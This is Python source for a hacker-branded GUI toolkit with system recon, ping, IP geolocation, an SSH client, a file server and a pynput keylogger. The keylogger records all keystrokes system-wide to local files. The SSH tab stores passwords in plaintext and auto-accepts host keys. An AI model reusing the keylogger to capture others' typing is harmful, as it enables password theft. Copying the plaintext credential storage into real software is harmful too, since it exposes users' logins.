import os
import base64
import threading
import tkinter as tk
from tkinter import filedialog, simpledialog, messagebox
from tkinter import ttk
from ttkthemes import ThemedStyle
from http.server import SimpleHTTPRequestHandler, HTTPServer
import socket
import logging
import platform
import psutil
import subprocess
import folium
import requests
import paramiko  # For SSH functionality
import threading
import time
from fpdf import FPDF
from pynput import keyboard
import queue # Add this import
import asyncio
import asyncssh
import re


# Define global variables
keylogger_running = False
keystroke_buffer = ""
listener = None

def start_keylogger(log_box):
    global keylogger_thread, keylogger_running, keystroke_buffer, listener
    if keylogger_running:
        return
    keylogger_running = True

    def on_press(key):
        global keystroke_buffer
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)

        # Add space after special characters and enhance visibility
        if not key_str.isalnum():
            key_str = f' {key_str} '
            log_box.insert(tk.END, key_str, 'special')
        else:
            log_box.insert(tk.END, key_str)

        keystroke_buffer += key_str
        log_box.see(tk.END)
        with open('log.txt', 'a') as log_file:
            log_file.write(key_str)

    def main():
        global listener
        try:
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            listener.join()
        except Exception as e:
            log_box.insert(tk.END, f"\nException in keylogger: {e}\n")
            log_box.see(tk.END)

    keylogger_thread = threading.Thread(target=main)
    keylogger_thread.start()

def stop_keylogger():
    global keylogger_running, listener
    keylogger_running = False
    if listener:
        listener.stop()
        listener = None

def save_logs():
    global keystroke_buffer
    with open('Keylogs.txt', 'w') as log_file:
        log_file.write(keystroke_buffer)





# Functions to get system information
def get_system_info():
    system_info = f"""
    System: {platform.system()}
    Node Name: {platform.node()}
    Release: {platform.release()}
    Version: {platform.version()}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    """
    return system_info

def get_memory_info():
    memory = psutil.virtual_memory()
    memory_info = f"""
    Total: {memory.total}
    Available: {memory.available}
    Used: {memory.used}
    Percentage: {memory.percent}%
    """
    return memory_info

def get_cpu_info():
    cpu_info = f"""
    Physical cores: {psutil.cpu_count(logical=False)}
    Total cores: {psutil.cpu_count(logical=True)}
    Max Frequency: {psutil.cpu_freq().max}Mhz
    Min Frequency: {psutil.cpu_freq().min}Mhz
    Current Frequency: {psutil.cpu_freq().current}Mhz
    CPU Usage Per Core: {psutil.cpu_percent(percpu=True, interval=1)}
    Total CPU Usage: {psutil.cpu_percent()}%
    """
    return cpu_info

def get_disk_info():
    disk_info = ""
    for partition in psutil.disk_partitions():
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            continue
        disk_info += f"""
    Device: {partition.device}
    Mountpoint: {partition.mountpoint}
    File system type: {partition.fstype}
    Total Size: {partition_usage.total}
    Used: {partition_usage.used}
    Free: {partition_usage.free}
    Percentage: {partition_usage.percent}%
        """
    return disk_info

def get_open_ports():
    open_ports = "\nOpen Ports\n====================================================\n"
    connections = psutil.net_connections(kind='inet')
    for conn in connections:
        if conn.status == 'LISTEN':
            open_ports += f"    Port: {conn.laddr.port}\n"
    return open_ports

def get_network_interfaces():
    interfaces = "\nNetwork Interfaces\n====================================================\n"
    net_if_addrs = psutil.net_if_addrs()
    for interface, addrs in net_if_addrs.items():
        interfaces += f"\nInterface: {interface}\n"
        for addr in addrs:
            interfaces += f"  Address: {addr.address}\n"
    return interfaces

def get_open_connections():
    connections = "\nOpen Connections\n====================================================\n"
    net_conns = psutil.net_connections()
    for conn in net_conns:
        if conn.status == 'ESTABLISHED':
            connections += f"  {conn.laddr.ip}:{conn.laddr.port} -> {conn.raddr.ip}:{conn.raddr.port}\n"
    return connections

def get_running_processes():
    processes = "\nRunning Processes\n====================================================\n"
    for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
        processes += f"PID: {proc.info['pid']} | Name: {proc.info['name']} | User: {proc.info['username']} | Status: {proc.info['status']}\n"
    return processes

# Function to update the log box with system information
def update_log_box(log_box):
    log_box.delete(1.0, tk.END)
    # Insert ASCII art at the top of the log box
    ascii_art = r"""
     ____   ___   ___  _   _  ___ _   ____             _____       
    |  _ \ / _ \ / _ \| |_| |/ (_) |_|  _ \ __ ___   _|___ / _ __  
    | |_) | | | | | | | __| ' /| | __| |_) / _` \ \ / / |_ \| '_ \ 
    |  _ <| |_| | |_| | |_| . \| | |_|  _ < (_| |\ V / ___) | | | |
    |_| \_\\___/ \___/ \__|_|\_\_|\__|_| \_\__,_| \_/ |____/|_| |_|
    Amir Faramarzpour 2024-2025
    Cod3d in Python
    """
    log_box.insert(tk.END, ascii_art + "\n")
    log_box.insert(tk.END, "System Information\n====================================================\n")
    log_box.insert(tk.END, get_system_info())
    log_box.insert(tk.END, "\nMemory Information\n====================================================\n")
    log_box.insert(tk.END, get_memory_info())
    log_box.insert(tk.END, "\nCPU Information\n====================================================\n")
    log_box.insert(tk.END, get_cpu_info())
    log_box.insert(tk.END, "\nDisk Information\n====================================================\n")
    log_box.insert(tk.END, get_disk_info())
    log_box.insert(tk.END, "\n")
    log_box.insert(tk.END, get_open_ports())
    log_box.insert(tk.END, get_network_interfaces())
    log_box.insert(tk.END, get_open_connections())
    log_box.insert(tk.END, get_running_processes())

    # Add ipconfig result to log box
    ipconfig_result = subprocess.getoutput("ipconfig" if os.name == 'nt' else "ifconfig")
    log_box.insert(tk.END, "\nIP Configuration\n====================================================\n")
    log_box.insert(tk.END, ipconfig_result)

def ping(domain):
    result = subprocess.run(['ping', '-c', '4', domain] if os.name != 'nt' else ['ping', domain], capture_output=True, text=True)
    with open('Ping.txt', 'a') as log_file:
        log_file.write(result.stdout)
    return result.stdout

def update_ping(log_box):
    domain_or_ip = simpledialog.askstring("Ping", "Enter IP or domain:")
    if domain_or_ip:
        log_box.insert(tk.END, f"\nPinging {domain_or_ip}\n====================================================\n")
        log_box.insert(tk.END, ping(domain_or_ip))

def ip_tracer(log_box):
    ip_address = simpledialog.askstring("IP Tracer", "Enter IP address:")
    if not ip_address:
        return
    
    def get_location(ip_address):
        try:
            response = requests.get(f"https://ipinfo.io/{ip_address}/json")
            response.raise_for_status()
            data = response.json()
            loc = data.get("loc", None)
            if loc:
                lat, long = map(float, loc.split(","))
            else:
                lat, long = None, None
            city = data.get("city", "Unknown")
            state = data.get("region", "Unknown")
            country = data.get("country", "Unknown")
            org = data.get("org", "Unknown")
            return lat, long, city, state, country, org
        except requests.exceptions.RequestException as e:
            log_box.insert(tk.END, f"Error fetching location for {ip_address}: {e}\n")
            return None

    location = get_location(ip_address)

    if location:
        lat, long, city, state, country, org = location
        log_box.insert(tk.END, f"\nIP Traceroute for {ip_address}\n====================================================\n")
        log_box.insert(tk.END, f"IP address is located in {city}, {state}, {country}\n")
        log_box.insert(tk.END, f"Latitude: {lat}, Longitude: {long}\n")
        log_box.insert(tk.END, f"Organization: {org}\n")
        # Create a map centered around the location
        m = folium.Map(location=[lat, long], zoom_start=10)
        folium.Marker([lat, long], popup=f"{city}, {state}, {country}").add_to(m)
        m.save("location_map.html")
        log_box.insert(tk.END, "Map saved as location_map.html\n")
    else:
        log_box.insert(tk.END, "Unable to fetch location.\n")



# Enhanced function to remove ANSI escape codes
def remove_ansi_escape_codes(text):
    ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

# Updated read_from_ssh function
def ssh_connect(ssh_terminal, ip_entry, username_entry, password_entry, input_entry, remember_var):
    ip = ip_entry.get()
    username = username_entry.get()
    password = password_entry.get()

    if remember_var.get():
        with open('ssh_credentials.txt', 'w') as f:
            f.write(f'{ip}\n{username}\n{password}\n')
    else:
        if os.path.exists('ssh_credentials.txt'):
            os.remove('ssh_credentials.txt')
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password)

        # Start an interactive shell session
        channel = ssh.invoke_shell()

        ssh_terminal.insert(tk.END, f"\nSSH Connection to {ip}\n=================\n")
        ssh_terminal.insert(tk.END, "Interactive SSH session started. Type your commands below. Type 'exit' or 'quit' to end the session.\n")

        def read_from_ssh():
            while True:
                if channel.recv_ready():
                    output = channel.recv(4096).decode('utf-8')
                    output = remove_ansi_escape_codes(output)  # Filter out ANSI escape codes
                    if output.strip():  # Only insert non-empty output
                        ssh_terminal.insert(tk.END, output)
                        ssh_terminal.see(tk.END)
                time.sleep(0.1)
                if not channel.recv_ready() and channel.exit_status_ready():
                    break

        def send_command(event):
            command = input_entry.get()
            input_entry.delete(0, tk.END)
            if command.lower() in ['exit', 'quit']:
                channel.close()
                ssh.close()
                ssh_terminal.insert(tk.END, "SSH session closed.\n")
                return
            if command:
                channel.send(command + '\n')
        
        input_entry.bind("<Return>", send_command)

        # Create a thread to handle reading from the SSH session
        reader_thread = threading.Thread(target=read_from_ssh)
        reader_thread.start()

    except Exception as e:
        ssh_terminal.insert(tk.END, f"\nError connecting to {ip}: {e}\n")


# Home Server App components
class AuthHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_AUTHHEAD(self):
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Login Required"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Unauthorized access')

    def do_GET(self):
        if self.headers.get('Authorization') is None:
            self.do_AUTHHEAD()
            self.wfile.write(b'Unauthorized access')
        else:
            auth_type, credentials = self.headers['Authorization'].split(' ', 1)
            if auth_type == 'Basic':
                username, password = base64.b64decode(credentials).decode().split(':', 1)
                if username == self.server.username and password == self.server.password:
                    os.chdir(self.server.directory)
                    self.server.connected_devices.add(self.client_address[0])
                    self.server.app.update_connected_devices()
                    self.server.app.log(f"Request from {self.client_address[0]}")
                    return super().do_GET()
            self.do_AUTHHEAD()
            self.wfile.write(b'Unauthorized access')

class FileServerApp:
    def __init__(self, root):
        self.root = root
        self.server = None
        self.server_thread = None
        self.directory = tk.StringVar()
        self.username = tk.StringVar()
        self.password = tk.StringVar()
        self.port = tk.IntVar(value=8000)
        self.local_ip = self.get_local_ip()
        self.connected_devices = set()
        self.create_widgets()

    def create_widgets(self):
        frame = ttk.Frame(self.root)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        ttk.Label(frame, text="Directory to Share:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.directory_entry = ttk.Entry(frame, textvariable=self.directory, width=40)
        self.directory_entry.grid(row=1, column=1, padx=5, pady=5)
        ttk.Button(frame, text="Browse", command=self.browse_directory).grid(row=1, column=2, padx=5, pady=5)
        ttk.Label(frame, text="Username:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.username_entry = ttk.Entry(frame, textvariable=self.username, width=40)
        self.username_entry.grid(row=2, column=1, padx=5, pady=5)
        ttk.Label(frame, text="Password:").grid(row=3, column=0, padx=5, pady=5, sticky=tk.W)
        self.password_entry = ttk.Entry(frame, textvariable=self.password, width=40, show="*")
        self.password_entry.grid(row=3, column=1, padx=5, pady=5)
        ttk.Label(frame, text="Port:").grid(row=4, column=0, padx=5, pady=5, sticky=tk.W)
        self.port_entry = ttk.Entry(frame, textvariable=self.port, width=10)
        self.port_entry.grid(row=4, column=1, padx=5, pady=5, sticky=tk.W)
        ttk.Button(frame, text="Start Server", command=self.start_server).grid(row=5, column=0, padx=5, pady=5, sticky=tk.W)
        self.stop_button = ttk.Button(frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.grid(row=5, column=1, padx=5, pady=5, sticky=tk.W)
        self.log_text = tk.Text(frame, height=10, width=60)
        self.log_text.grid(row=6, column=0, columnspan=3, padx=5, pady=5)
        ttk.Label(frame, text="Connected Devices:").grid(row=7, column=0, padx=5, pady=5, sticky=tk.W)
        self.connected_devices_text = tk.Text(frame, height=5, width=60)
        self.connected_devices_text.grid(row=8, column=0, columnspan=3, padx=5, pady=5)
        # Add this part to the bottom of the create_widgets method
        copyright_frame = ttk.Frame(self.root)
        copyright_frame.pack(fill=tk.X, padx=5, pady=5)
        copyright_text = f"Local Server Address: http://{self.local_ip}:8000"
        ttk.Label(copyright_frame, text=copyright_text, font=("Arial", 10)).pack()

    def browse_directory(self):
        directory = filedialog.askdirectory()
        if directory:
            self.directory.set(directory)

    def log(self, message):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        print(message)  # Also print to console for debugging

    def update_connected_devices(self):
        self.connected_devices_text.delete(1.0, tk.END)
        for device in self.connected_devices:
            self.connected_devices_text.insert(tk.END, f"{device}\n")
        self.connected_devices_text.see(tk.END)

    def start_server(self):
        directory = self.directory.get()
        username = self.username.get()
        password = self.password.get()
        port = self.port.get()
        if not directory or not username or not password or not port:
            messagebox.showerror("Error", "All fields are required!")
            return
        handler_class = AuthHTTPRequestHandler
        handler_class.username = username
        handler_class.password = password
        self.server = HTTPServer(('', port), handler_class)
        self.server.directory = directory
        self.server.username = username
        self.server.password = password
        self.server.connected_devices = self.connected_devices
        self.server.app = self
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()
        self.log(f"Serving on port {port}...")
        self.stop_button.config(state=tk.NORMAL)

    def stop_server(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server_thread.join()
            self.log("Server stopped.")
            self.stop_button.config(state=tk.DISABLED)

    def get_local_ip(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except Exception:
            ip = '127.0.0.1'
        return ip


def save_main_log_box_content(log_box):
    content = log_box.get("1.0", tk.END)  # Get all content from the log box
    with open('Recon.txt', 'w') as log_file:
        log_file.write(content)
    messagebox.showinfo("Export Logs", "Logs exported to Recon.txt")

def create_main_window():
    root = tk.Tk()
    root.title("R00tKitRav3n v5.0.0")
    root.geometry("800x600")

    style = ThemedStyle(root)
    style.set_theme("equilux")  # Set the desired theme from ttkthemes

    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True)

    # System Recon tab
    frame_recon = ttk.Frame(notebook)
    notebook.add(frame_recon, text="System Recon")

    log_box = tk.Text(frame_recon, height=20, width=20, wrap=tk.WORD)  # Adjusted width
    log_box.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    button_frame_recon = ttk.Frame(frame_recon)
    button_frame_recon.pack(pady=10)

    button_options = {'sticky': 'ew', 'padx': 5, 'pady': 5, 'ipadx': 10, 'ipady': 10}

    # Adding System Recon label
    #ttk.Label(button_frame_recon, text="System Recon and basic Network tools", font=("Helvetica", 14, 'bold')).grid(row=0, column=0, columnspan=3, pady=10)

    ttk.Button(button_frame_recon, text="Get System Info", command=lambda: update_log_box(log_box)).grid(row=0, column=0, **button_options)
    ttk.Button(button_frame_recon, text="Export Logs", command=lambda: save_main_log_box_content(log_box)).grid(row=0, column=1, **button_options)

    # Adding simple text between buttons
    #ttk.Label(button_frame_recon, text="Network Tools", font=("Helvetica", 14, 'bold')).grid(row=2, column=0, columnspan=3, pady=10)
    
    ttk.Button(button_frame_recon, text="Ping ip/domain", command=lambda: update_ping(log_box)).grid(row=0, column=2, **button_options)
    ttk.Button(button_frame_recon, text="Geolocate ip address", command=lambda: ip_tracer(log_box)).grid(row=0, column=3, **button_options)

    for i in range(3):
        button_frame_recon.grid_columnconfigure(i, weight=1)

        # SSH tab
    frame_ssh = ttk.Frame(notebook)
    notebook.add(frame_ssh, text="SSH Platform")

    ssh_terminal = tk.Text(frame_ssh, height=20, width=40, wrap=tk.WORD)
    ssh_terminal.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    input_frame_ssh = ttk.Frame(frame_ssh)
    input_frame_ssh.pack(fill=tk.X, padx=10, pady=5)

    ip_label = ttk.Label(input_frame_ssh, text="IP:")
    ip_label.pack(side=tk.LEFT)
    ip_entry = ttk.Entry(input_frame_ssh)
    ip_entry.pack(side=tk.LEFT, padx=5)

    username_label = ttk.Label(input_frame_ssh, text="Username:")
    username_label.pack(side=tk.LEFT)
    username_entry = ttk.Entry(input_frame_ssh)
    username_entry.pack(side=tk.LEFT, padx=5)

    password_label = ttk.Label(input_frame_ssh, text="Password:")
    password_label.pack(side=tk.LEFT)
    password_entry = ttk.Entry(input_frame_ssh, show='*')
    password_entry.pack(side=tk.LEFT, padx=5)

    remember_var = tk.IntVar()
    remember_checkbox = ttk.Checkbutton(input_frame_ssh, text="Remember Me", variable=remember_var)
    remember_checkbox.pack(side=tk.LEFT, padx=5)

    connect_button = ttk.Button(input_frame_ssh, text="Connect", command=lambda: ssh_connect(
        ssh_terminal, ip_entry, username_entry, password_entry, input_entry, remember_var
    ))
    connect_button.pack(side=tk.RIGHT)

    input_entry = ttk.Entry(frame_ssh)
    input_entry.pack(fill=tk.X, padx=10, pady=5)


    # Keylogger tab
    frame_keylogger = ttk.Frame(notebook)
    notebook.add(frame_keylogger, text="Keylogger")

    keylogger_log_box = tk.Text(frame_keylogger, height=20, width=20, wrap=tk.WORD)
    keylogger_log_box.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    # Define a tag for special characters
    keylogger_log_box.tag_configure('special', foreground='red')

    keylogger_button_frame = ttk.Frame(frame_keylogger)
    keylogger_button_frame.pack(pady=10)

    keylogger_start_button = ttk.Button(keylogger_button_frame, text="Start Keylogger", command=lambda: start_keylogger(keylogger_log_box))
    keylogger_start_button.pack(side=tk.LEFT, padx=5)

    keylogger_stop_button = ttk.Button(keylogger_button_frame, text="Stop Keylogger", command=stop_keylogger)
    keylogger_stop_button.pack(side=tk.LEFT, padx=5)

    save_logs_button = ttk.Button(keylogger_button_frame, text="Save Logs", command=save_logs)
    save_logs_button.pack(side=tk.LEFT, padx=5)



    # Home Server tab
    frame_server = ttk.Frame(notebook)
    notebook.add(frame_server, text="Server Config")

    file_server_app = FileServerApp(frame_server)

    # Add a copyright label with server IP address at the bottom of the main window
    copyright_frame = ttk.Frame(root)
    copyright_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=5)

    server_ip = socket.gethostbyname(socket.gethostname())  # Retrieve the server IP address
    copyright_text = f"© 2024-2025 R00tKitRav3n. All rights reserved."
    ttk.Label(copyright_frame, text=copyright_text, font=("Arial", 10)).pack()


   # Info & Credits tab
    frame_info = ttk.Frame(notebook)
    notebook.add(frame_info, text="Info & Credits")

    info_text = tk.Text(frame_info, height=20, width=60, wrap=tk.WORD)
    info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    # Add your information here
    info_content = r"""
    System Information, File Sharing Server and SSH Platform
    =========================================
    
     ____   ___   ___  _   _  ___ _   ____             _____       
    |  _ \ / _ \ / _ \| |_| |/ (_) |_|  _ \ __ ___   _|___ / _ __  
    | |_) | | | | | | | __| ' /| | __| |_) / _` \ \ / / |_ \| '_ \ 
    |  _ <| |_| | |_| | |_| . \| | |_|  _ < (_| |\ V / ___) | | | |
    |_| \_\\___/ \___/ \__|_|\_\_|\__|_| \_\__,_| \_/ |____/|_| |_|
    Cod3d in Python
    Developed by: Amir Faramarzpour
    Year: 2024-2025

    Credits:
    - Python Software Foundation: Python language and standard libraries
    - Tkinter: GUI development
    - Pynput: Keylogger functionality
    - Paramiko: SSH functionality
    - Requests: HTTP requests and IP tracing
    - Folium: Map generation
    - Psutil: System and process utilities
    - TTkthemes: Themed Tkinter widgets
    
    Useful Information:
    - This tool provides system information, keylogging, SSH, and file sharing capabilities.
    - Ensure you have appropriate permissions to use these features.
    - Keep your software up to date for security and performance improvements.
    - Always use secure passwords and encryption for SSH connections.


    """

    info_text.insert(tk.END, info_content)
    info_text.config(state=tk.DISABLED)  # Make the text box read-only




    root.mainloop()

# Example of how to run the GUI
if __name__ == "__main__":
    create_main_window()

